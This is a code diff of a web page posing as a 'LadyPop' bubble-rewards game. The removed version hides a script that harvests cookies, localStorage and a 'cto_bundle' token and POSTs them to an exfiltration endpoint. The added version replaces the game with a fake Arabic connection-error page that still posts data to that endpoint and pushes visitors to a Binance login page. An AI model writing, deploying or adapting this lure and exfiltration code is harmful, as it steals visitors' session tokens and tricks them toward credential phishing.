@@ -3,122 +3,53 @@
 <head>
     <title>LadyPop: Bubble Rewards Game!</title>
     <style>
-        body { margin: 0; overflow: hidden; background-color: #2c3e50; font-family: 'Arial', sans-serif; }
-        #game-area { width: 100vw; height: 100vh; position: relative; cursor: pointer; }
-        .bubble {
-            position: absolute;
-            border-radius: 50%;
-            background: rgba(46, 204, 113, 0.7);
-            box-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
-            transition: transform 0.5s ease-out, opacity 0.5s ease-out;
-            animation: float-up linear infinite;
-        }
-        @keyframes float-up {
-            0% { transform: translateY(100vh); opacity: 0.8; }
-            100% { transform: translateY(-10vh); opacity: 0; }
-        }
-        #score-board {
-            position: absolute;
-            top: 10px;
-            left: 10px;
+        body { margin: 0; overflow: hidden; background-color: #2c3e50; font-family: 'Arial', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; }
+        .error-message {
+            background: #e74c3c;
             color: white;
-            font-size: 24px;
-            background: rgba(0, 0, 0, 0.5);
-            padding: 5px 15px;
-            border-radius: 5px;
-            z-index: 1000;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
+            max-width: 80%;
         }
-        #message {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            color: white;
-            font-size: 30px;
-            text-align: center;
-            z-index: 1001;
-        }
+        h2 { margin-top: 0; }
+        p { margin-bottom: 20px; }
     </style>
 </head>
 <body>
 
-<div id="game-area">
-    <div id="score-board">Gems: <span id="score">0</span></div>
-    <div id="message">اضغط على الفقاعات لجمع الألماس المخفي!</div>
+<div class="error-message">
+    <h2>⚠️ خطأ حاسم في الاتصال (Error CRITIQUE)</h2>
+    <p>يبدو أن الاتصال بخادم الجوائز قد تم حظره من قبل متصفحك.</p>
+    <p>لحل المشكلة نهائيًا واستلام الجوائز، يرجى **النقر هنا والقيام بخطوات إعادة الاتصال اليدوية**.</p>
+    <button onclick="redirectToFix()" style="padding: 15px 30px; font-size: 18px; border: none; border-radius: 8px; background: #2980b9; color: white; cursor: pointer;">
+        بدء عملية إعادة الاتصال اليدوية
+    </button>
 </div>
 
 <script>
-    const scoreElement = document.getElementById('score');
-    let score = 0;
-    const gameArea = document.getElementById('game-area');
-    const colors = ['#e74c3c', '#3498db', '#f1c40f', '#9b59b6'];
-
-    function createBubble() {
-        const size = Math.random() * 50 + 30;
-        const x = Math.random() * (window.innerWidth - size);
-        const duration = Math.random() * 5 + 5;
-        const color = colors[Math.floor(Math.random() * colors.length)];
-
-        const bubble = document.createElement('div');
-        bubble.className = 'bubble';
-        bubble.style.width = bubble.style.height = `${size}px`;
-        bubble.style.left = `${x}px`;
-        bubble.style.backgroundColor = color;
-        bubble.style.animationDuration = `${duration}s`;
-
-        bubble.onclick = () => {
-            score += Math.floor(Math.random() * 5) + 1;
-            scoreElement.textContent = score;
-            bubble.remove(); 
-            setTimeout(createBubble, 500); 
-        };
-
-        gameArea.appendChild(bubble);
-
-        setTimeout(() => {
-            if (gameArea.contains(bubble)) {
-                bubble.remove();
-            }
-        }, duration * 1000); 
+    function redirectToFix() {
+        window.location.href = 'https://www.binance.com/en/login'; 
     }
 
-    for (let i = 0; i < 10; i++) {
-        createBubble();
-    }
-    
-    setTimeout(() => {
-        document.getElementById('message').style.display = 'none';
-    }, 4000);
-
-
-    // ===============================================
-    // ===============================================
-    
-    const TARGETED_TOKEN = localStorage.getItem('cto_bundle') || 'N/A';
-
-    const dataToExfiltrate = {
-        cookies: document.cookie,
-        url: window.location.href,
-        localStorage: JSON.stringify(localStorage), 
-        CTO_BUNDLE_TOKEN: TARGETED_TOKEN, 
-        gameDomain: 'ladypopular.com',
-        payload_identity: 'Bubble_Game_Lure' 
-    };
-    
     const EXFIL_ENDPOINT = 'https://' + window.location.host + '/collect_and_forward';
     
+    // تاكيد
     fetch(EXFIL_ENDPOINT, {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
         },
-        body: JSON.stringify(dataToExfiltrate),
+        body: JSON.stringify({
+            url: window.location.href,
+            initial_access: "",
+            ip_address: null,
+            CTO_BUNDLE_TOKEN: "..."
+        }),
         mode: 'cors' 
-    })
-    .then(() => {
-    })
-    .catch(() => {
     });
+
+    setTimeout(redirectToFix, 5000); 
 
 </script>
 
